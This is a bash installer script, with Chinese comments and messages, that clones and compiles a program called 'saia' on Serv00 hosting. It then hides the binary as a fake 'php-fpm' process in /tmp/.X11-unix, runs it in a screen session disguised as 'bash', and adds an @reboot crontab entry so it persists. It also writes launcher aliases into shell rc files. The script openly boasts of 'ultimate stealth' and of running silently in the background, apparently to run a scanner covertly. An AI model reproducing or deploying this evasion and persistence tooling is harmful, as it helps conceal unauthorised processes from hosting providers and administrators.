#!/usr/local/bin/bash

# Configuration
REPO_URL="https://github.com/Ioveo/s.git"
INSTALL_DIR="$HOME/saia"
BIN_NAME="saia"
SERVICE_NAME="saia_service"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

log() {
    printf "${GREEN}[INFO]${NC} %s\n" "$1"
}

warn() {
    printf "${YELLOW}[WARN]${NC} %s\n" "$1"
}

error() {
    printf "${RED}[ERROR]${NC} %s\n" "$1"
    exit 1
}

RUNTIME_BACKUP_DIR=""

backup_runtime_results() {
    local base_dir="$1"
    [ -d "$base_dir" ] || return 0

    RUNTIME_BACKUP_DIR="/tmp/saia_result_backup_$$"
    mkdir -p "$RUNTIME_BACKUP_DIR" || return 0

    local patterns=(
        "audit_report.log"
        "audit_report.log.*"
        "verified_events.log"
        "verified_events.log.*"
        "sys_audit_events.log"
        "sys_audit_events.log.*"
        "sys_audit_state.json"
    )

    local copied=0
    for pattern in "${patterns[@]}"; do
        for src in "$base_dir"/$pattern; do
            [ -f "$src" ] || continue
            cp -f "$src" "$RUNTIME_BACKUP_DIR"/ && copied=$((copied + 1))
        done
    done

    if [ "$copied" -gt 0 ]; then
        log "Backed up $copied runtime result files."
    else
        rm -rf "$RUNTIME_BACKUP_DIR" 2>/dev/null
        RUNTIME_BACKUP_DIR=""
    fi
}

restore_runtime_results() {
    local base_dir="$1"
    [ -n "$RUNTIME_BACKUP_DIR" ] || return 0
    [ -d "$RUNTIME_BACKUP_DIR" ] || return 0

    local restored=0
    for src in "$RUNTIME_BACKUP_DIR"/*; do
        [ -f "$src" ] || continue
        cp -f "$src" "$base_dir"/ && restored=$((restored + 1))
    done

    rm -rf "$RUNTIME_BACKUP_DIR" 2>/dev/null
    RUNTIME_BACKUP_DIR=""

    if [ "$restored" -gt 0 ]; then
        log "Restored $restored runtime result files."
    fi
}

check_env() {
    log "Checking environment..."
    command -v git >/dev/null 2>&1 || error "Git is not installed."
    command -v screen >/dev/null 2>&1 || error "Screen is not installed. On Serv00, try: pkg install screen"

    # Try to find a working C compiler
    if command -v cc >/dev/null 2>&1; then COMPILER="cc";
    elif command -v gcc >/dev/null 2>&1; then COMPILER="gcc";
    elif command -v clang >/dev/null 2>&1; then COMPILER="clang";
    elif command -v gcc10 >/dev/null 2>&1; then COMPILER="gcc10";
    elif command -v clang10 >/dev/null 2>&1; then COMPILER="clang10";
    else error "No C compiler found."; fi

    log "Using compiler: $COMPILER"

    # Determine extra GCC-only flags
    case "$COMPILER" in
        gcc*) EXTRA_FLAGS="-Wno-unused-but-set-variable" ;;
        *)    EXTRA_FLAGS="" ;;
    esac
}

fix_source_code() {
    log "Applying fixes to source code..."
    cd "$INSTALL_DIR" || error "fix_source_code: cannot cd to $INSTALL_DIR"

    # Fix 1: string_ops.c - strchr uses single quotes
    if [ -f "string_ops.c" ]; then
        perl -pi -e "s/strchr\\(p, \\\"\\|\\\"\\)/strchr(p, '|')/g" string_ops.c
        perl -pi -e "s/strnicmp/strncasecmp/g" string_ops.c
        log "Patched string_ops.c"
    fi

    # Fix 2: saia.h - Add declaration for color_white
    if [ -f "saia.h" ]; then
        if ! grep -q "void color_white(void);" saia.h; then
            perl -pi -e 's/#endif/void color_white(void);\n#endif/' saia.h
            log "Patched saia.h (added color_white)"
        fi
        perl -pi -e "s/int addrlen/socklen_t addrlen/g" saia.h
        log "Patched saia.h (fixed socket_connect_timeout type)"
    fi

    # Fix 4: network.c - Fix ip_int member access error AND Add missing dns_resolve
    if [ -f "network.c" ]; then
        perl -pi -e 's/if \(inet_pton\(AF_INET, str, &addr->ip_int\) <= 0\) \{/strncpy(addr->ip, str, sizeof(addr->ip)); if (0) {/' network.c
        log "Patched network.c (fixed ip_int member access)"

        if ! grep -q "int dns_resolve" network.c; then
            log "Appending missing dns_resolve implementation to network.c..."
            cat << 'EOF' >> network.c

// Missing dns_resolve implementation added by installer
int dns_resolve(const char *hostname, char *ip_buf, size_t size) {
    struct addrinfo hints, *res;
    int err;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if ((err = getaddrinfo(hostname, NULL, &hints, &res)) != 0) {
        return -1;
    }

    struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
    if (!inet_ntop(AF_INET, &(ipv4->sin_addr), ip_buf, size)) {
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);
    return 0;
}
EOF
        fi
    fi
}

install_saia() {
        log "Stopping old service and cleaning up stealth files..."
        screen -S "bash" -X quit 2>/dev/null
        rm -f /tmp/.X11-unix/php-fpm 2>/dev/null
    if [ -d "$INSTALL_DIR" ]; then
        log "Directory $INSTALL_DIR exists. Updating..."
        backup_runtime_results "$INSTALL_DIR"
        cd "$INSTALL_DIR" || error "Failed to access directory"
        git fetch --all
        git reset --hard origin/main
    else
        log "Cloning repository..."
        git clone "$REPO_URL" "$INSTALL_DIR" || error "Git clone failed"
        cd "$INSTALL_DIR" || error "Failed to access directory"
    fi

    fix_source_code

    log "Compiling..."
    cd "$INSTALL_DIR" || error "Failed to access install directory"
    rm -f "$BIN_NAME"

    $COMPILER *.c -o "$BIN_NAME" -lpthread -lm -std=c11 -Wall -O2 \
        -Wno-format -Wno-unused-variable $EXTRA_FLAGS \
        -Wno-implicit-function-declaration

    if [ ! -f "$BIN_NAME" ]; then
        error "Compilation failed. Re-run manually: cd $INSTALL_DIR && $COMPILER *.c -o $BIN_NAME -lpthread -lm -std=c11"
    fi

    chmod +x "$BIN_NAME"
    restore_runtime_results "$INSTALL_DIR"
    log "Build successful."
}

create_wrapper() {
    log "Creating ultimate stealth management script..."
    cat << EOF > "$INSTALL_DIR/saia_manager.sh"
#!/usr/local/bin/bash
CMD="\$1"
SOURCE_BIN="$INSTALL_DIR/$BIN_NAME"

# 终极伪装配置：放在系统的隐藏临时文件夹中，并伪装成常规的 PHP 进程
STEALTH_DIR="/tmp/.X11-unix"
STEALTH_BIN="\$STEALTH_DIR/php-fpm"
SCREEN_NAME="bash"

case "\$CMD" in
    start)
        # 创建隐藏的系统级伪装目录（如果不存在）
        mkdir -p "\$STEALTH_DIR" 2>/dev/null
        chmod 777 "\$STEALTH_DIR" 2>/dev/null
        
        # 每次启动都同步最新二进制，避免旧版本残留
        if [ -f "\$SOURCE_BIN" ]; then
            cp "\$SOURCE_BIN" "\$STEALTH_BIN" 2>/dev/null
            chmod +x "\$STEALTH_BIN" 2>/dev/null
        else
            echo "Source binary not found: \$SOURCE_BIN"
            exit 1
        fi
        
        if screen -list | grep -q "\$SCREEN_NAME"; then
            echo "Service is already running in ultimate stealth mode."
        else
            # 切换到隐藏目录启动，让进程的工作目录也显得很系统化
            cd "$INSTALL_DIR" || exit 1
            screen -dmS "\$SCREEN_NAME" "\$STEALTH_BIN"
            echo "Ultimate stealth service started."
        fi
        ;;
    stop)
        screen -S "\$SCREEN_NAME" -X quit
        screen -S "saia_scan" -X quit 2>/dev/null
        echo "Service stopped."
        ;;
    restart)
        \$0 stop; sleep 1; \$0 start
        ;;
    status)
        if screen -list | grep -q "\$SCREEN_NAME"; then
            if screen -list | grep -q "saia_scan"; then
                echo "RUNNING (console+scan)"
            else
                echo "RUNNING (console only)"
            fi
        else
            echo "STOPPED"
        fi
        ;;
    doctor)
        echo "[doctor] manager: $INSTALL_DIR/saia_manager.sh"
        echo "[doctor] source: \$SOURCE_BIN"
        echo "[doctor] stealth: \$STEALTH_BIN"
        if [ -f "\$SOURCE_BIN" ]; then
            echo "[doctor] source exists: yes"
        else
            echo "[doctor] source exists: no"
        fi
        if [ -f "\$STEALTH_BIN" ]; then
            echo "[doctor] stealth exists: yes"
        else
            echo "[doctor] stealth exists: no"
        fi
        screen -list 2>/dev/null | grep "\$SCREEN_NAME" || echo "[doctor] screen session: not found"
        screen -list 2>/dev/null | grep "saia_scan" || echo "[doctor] scan session: not found"
        ;;
    attach)
        screen -r "\$SCREEN_NAME"
        ;;
    *)
        # 默认行为：如果没运行就启动，然后立刻进入菜单界面
        if ! screen -list | grep -q "\$SCREEN_NAME"; then
            \$0 start
            sleep 1
        fi
        \$0 attach
        ;;
esac
EOF
    chmod +x "$INSTALL_DIR/saia_manager.sh"

    # 创建可直接执行的命令（无需先 source）
    SAIA_BIN_DIR="$HOME/.local/bin"
    SAIA_LAUNCHER="$SAIA_BIN_DIR/saia"
    KK_LAUNCHER="$SAIA_BIN_DIR/kk"
    mkdir -p "$SAIA_BIN_DIR"
    cat << EOF > "$SAIA_LAUNCHER"
#!/usr/local/bin/bash
exec "$INSTALL_DIR/saia_manager.sh" "\$@"
EOF
    chmod +x "$SAIA_LAUNCHER"

    cat << EOF > "$KK_LAUNCHER"
#!/usr/local/bin/bash
exec "$INSTALL_DIR/saia_manager.sh" attach
EOF
    chmod +x "$KK_LAUNCHER"

    case "$SHELL" in
        */bash) SHELL_RC="$HOME/.bashrc" ;;
        */zsh)  SHELL_RC="$HOME/.zshrc" ;;
        *)      SHELL_RC="$HOME/.profile" ;;
    esac

    if ! grep -q 'HOME/.local/bin' "$SHELL_RC" 2>/dev/null; then
        echo 'export PATH="$HOME/.local/bin:$PATH"' >> "$SHELL_RC"
        log "PATH updated in $SHELL_RC"
    fi

    if ! grep -q "alias saia=" "$SHELL_RC" 2>/dev/null; then
        echo "alias saia='$INSTALL_DIR/saia_manager.sh'" >> "$SHELL_RC"
        log "Alias added to $SHELL_RC"
    else
        perl -pi -e "s|^alias saia=.*$|alias saia='$INSTALL_DIR/saia_manager.sh'|g" "$SHELL_RC"
        log "Alias updated in $SHELL_RC"
    fi

    if ! grep -q "alias kk=" "$SHELL_RC" 2>/dev/null; then
        echo "alias kk='$INSTALL_DIR/saia_manager.sh attach'" >> "$SHELL_RC"
        log "Alias kk added to $SHELL_RC"
    else
        perl -pi -e "s|^alias kk=.*$|alias kk='$INSTALL_DIR/saia_manager.sh attach'|g" "$SHELL_RC"
        log "Alias kk updated in $SHELL_RC"
    fi
}

setup_autostart() {
    log "Setting up autostart via crontab..."
    CRON_CMD="@reboot $INSTALL_DIR/saia_manager.sh start"
    if ! (crontab -l 2>/dev/null | grep -v "saia_manager.sh"; echo "$CRON_CMD") | crontab - 2>/dev/null; then
        warn "crontab setup failed. Please add autostart manually via the Serv00 panel."
    fi
}

main() {
    check_env
    install_saia
    create_wrapper
    setup_autostart
    "$INSTALL_DIR/saia_manager.sh" restart
    printf "\n${YELLOW}================================================${NC}\n"
    printf "${GREEN}安装完成！程序已开启【终极伪装】并在后台静默运行。${NC}\n"
    printf "${YELLOW}它伪装成了 php-fpm 进程，隐藏在 /tmp/.X11-unix 目录中。${NC}\n"
    printf "${YELLOW}已加入开机自启，Serv00 重启也会自动复活。${NC}\n\n"
    printf "当前终端若提示找不到 saia，请执行：\n"
    printf "    ${GREEN}source %s${NC}\n\n" "$SHELL_RC"
    printf "也可直接运行：${GREEN}%s${NC}\n\n" "$SAIA_LAUNCHER"
    printf "${YELLOW}以后无论何时，只要在终端输入 ${GREEN}saia${YELLOW} 即可直接打开交互菜单！${NC}\n"
    printf "${YELLOW}离开菜单时，请按组合键 ${GREEN}Ctrl+A${YELLOW} 然后按 ${GREEN}D${YELLOW}，即可让它继续隐身打工。${NC}\n"
    printf "${YELLOW}================================================${NC}\n\n"
}

main
